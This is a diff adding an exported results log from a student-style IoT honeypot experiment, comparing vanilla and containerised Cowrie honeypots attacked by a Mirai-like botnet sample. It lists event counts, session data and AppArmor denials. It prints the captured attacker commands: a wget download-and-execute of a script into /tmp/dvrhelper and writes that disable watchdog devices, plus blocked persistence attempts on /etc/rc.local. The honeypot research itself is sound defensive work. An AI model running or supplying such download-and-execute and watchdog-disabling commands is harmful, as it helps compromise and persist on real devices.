@@ -1,0 +1,146 @@
+EXPERIMENT: Netgear-R7000-botnet-mirai-arm-448db776
+EXPORTED: 25/03/2026 17:43:37
+
+-=-=-= VANILLA HONEYPOT -=-=-=
+   source: /home/franek/IoT-Honeypot-for-Detecting-Attacks/Honeypot Project/vanilla-honeypot/cowrie
+   port: SSH 2222
+
+-=-=-= CONTAINERISED HONEYPOT -=-=-=
+   container: cowrie-honeypot
+   port: SSH 2223
+
+-=-=-= HOW TO LOAD LOGS -=-=-=
+  Pandas:
+    import pandas as pd
+    df = pd.read_json('vanilla/cowrie.json', lines=True)
+    df = pd.read_json('containerised/cowrie.json', lines=True)
+
+-=-=-= NOTES -=-=-=
+  cowrie.json : one JSON object per line (JSON Lines format)
+  cowrie.log  : human readable text version of same events
+  downloads/  : captured binaries named by SHA256 hash
+                Cowrie deduplicates — each unique file stored once
+
+- AA blocked three different malicious actions, relating to its persistance mechanism
+- Both honeypots succesfully connected to the C2 server, but connection refused
+	- This means the malware and C2 are very much alive
+	- But wget uses HTTP, this suggests the malware uses raw TCP (confirmed via the reconstructed payload, MalwareBazaar & tria.ge)
+
+
+
+
+
+CLI OUTPUT:
+
+============================================================
+RESULTS: Netgear-R7000-botnet-mirai-arm-448db776_25-03-2026_1743
+============================================================
+
+
+Vanilla Honeypot
+------------------------------------------------------------
+cowrie.json 31 events
+      10 cowrie.client.var
+       5 cowrie.session.file_download
+       4 cowrie.command.input
+       3 cowrie.session.file_download.failed
+       1 cowrie.session.connect
+       1 cowrie.client.version
+       1 cowrie.client.kex
+       1 cowrie.login.success
+       1 cowrie.session.profile
+       1 cowrie.client.size
+       1 cowrie.session.params
+       1 cowrie.log.closed
+       1 cowrie.session.closed
+    cowrie.log 116 lines
+
+Containerised Honeypot
+------------------------------------------------------------
+cowrie.json 31 events
+      10 cowrie.client.var
+       5 cowrie.session.file_download
+       4 cowrie.command.input
+       3 cowrie.session.file_download.failed
+       1 cowrie.session.connect
+       1 cowrie.client.version
+       1 cowrie.client.kex
+       1 cowrie.login.success
+       1 cowrie.session.profile
+       1 cowrie.client.size
+       1 cowrie.session.params
+       1 cowrie.log.closed
+       1 cowrie.session.closed
+    cowrie.log 460 lines
+
+    LOG CROSS-EXAMINATION
+------------------------------------------------------------
+Containerised.json == Vanilla.json?
+    Vanilla          json=4 log=4 TRUE
+    Containerised    json=4 log=14 FALSE
+
+SESSION COMPARISON
+------------------------------------------------------------
+    Vanilla:    1 session(s)
+        average duration 32.2s
+    Containerised:    1 session(s)
+        average duration 31.7s
+
+COMMAND COMPARISON
+------------------------------------------------------------
+    Vanilla:    4 command event(s)
+    Containerised:  4 command event(s)
+    Do commands match : TRUE
+
+COMMAND DETAILS
+------------------------------------------------------------
+    SESSION        TIMESTAMP                        COMMAND
+    [Vanilla] 1f7e383acf83 2026-03-25 17:39:45.622466+00:00 wget http://10.0.2.15:8888/botnet_mirai_arm_448db776.sh -O /tmp/dvrhelper
+    [Vanilla] 1f7e383acf83 2026-03-25 17:39:50.982810+00:00 chmod 777 /tmp/dvrhelper 
+    [Vanilla] 1f7e383acf83 2026-03-25 17:39:53.529064+00:00 exec /tmp/dvrhelper 
+    [Vanilla] 1f7e383acf83 2026-03-25 17:39:53.530070+00:00 echo '' > /dev/watchdog; echo '' > /dev/misc/watchdog; echo '' > /dev/watchdog0; echo '' > /sbin/wat
+    [Containerised] 233f40d1cb11 2026-03-25 17:41:41.165708+00:00 wget http://10.0.2.15:8888/botnet_mirai_arm_448db776.sh -O /tmp/dvrhelper
+    [Containerised] 233f40d1cb11 2026-03-25 17:41:45.840481+00:00 chmod 777 /tmp/dvrhelper 
+    [Containerised] 233f40d1cb11 2026-03-25 17:41:47.905462+00:00 exec /tmp/dvrhelper 
+    [Containerised] 233f40d1cb11 2026-03-25 17:41:47.906360+00:00 echo '' > /dev/watchdog; echo '' > /dev/misc/watchdog; echo '' > /dev/watchdog0; echo '' > /sbin/wat
+
+DOWNLOADS DETAILS
+------------------------------------------------------------
+    Hashes match:   TRUE
+    Shared hashes:  2
+
+APPARMOR DENIALS
+------------------------------------------------------------
+Total denials: 14
+
+By Operation:
+      12 mknod
+       2 open
+
+    Detail:
+
+    TIMESTAMP                        OPERATION  PROCESS    PATH
+    2026-03-25 17:42:35.233999968+00 mknod      twistd   /home/cowrie/cowrie/cowrie-env/lib/python3.12/site
+    2026-03-25 17:42:35.246999979+00 mknod      twistd   /home/cowrie/cowrie/src/cowrie/__pycache__/_versio
+    2026-03-25 17:42:35.263999939+00 mknod      twistd   /home/cowrie/cowrie/src/cowrie/commands/__pycache_
+    2026-03-25 17:42:35.286000013+00 mknod      twistd   /home/cowrie/cowrie/src/cowrie/commands/__pycache_
+    2026-03-25 17:42:35.286999941+00 open       twistd   /home/cowrie/cowrie/
+    2026-03-25 17:42:35.335999966+00 mknod      twistd   /home/cowrie/cowrie/src/cowrie/core/__pycache__/ne
+    2026-03-25 17:42:35.358999968+00 mknod      twistd   /home/cowrie/cowrie/src/cowrie/commands/__pycache_
+    2026-03-25 17:42:35.371999979+00 mknod      twistd   /home/cowrie/cowrie/src/cowrie/commands/__pycache_
+    2026-03-25 17:42:35.374000072+00 mknod      twistd   /home/cowrie/cowrie/cowrie-env/lib/python3.12/site
+    2026-03-25 17:42:35.377000093+00 mknod      twistd   /home/cowrie/cowrie/src/cowrie/ssh/__pycache__/ses
+    2026-03-25 17:42:35.378999949+00 mknod      twistd   /home/cowrie/cowrie/src/cowrie/ssh/__pycache__/fac
+    2026-03-25 17:42:50.073999882+00 open       bash     /dev/tty
+    2026-03-25 17:42:50.078000069+00 mknod      bash     /etc/rc.local
+    2026-03-25 17:42:50.078000069+00 mknod      bash     /etc/init.d/sysd
+
+SECCOMP DENIALS
+------------------------------------------------------------
+Total denials: 0
+   Visualising analysis...
+    Saved: 01_session_duration.png
+    Saved: 02_command_timeline.png
+    Saved: 03_apparmor_overview.png
+    Saved: 04_apparmor_blocked_paths.png
+
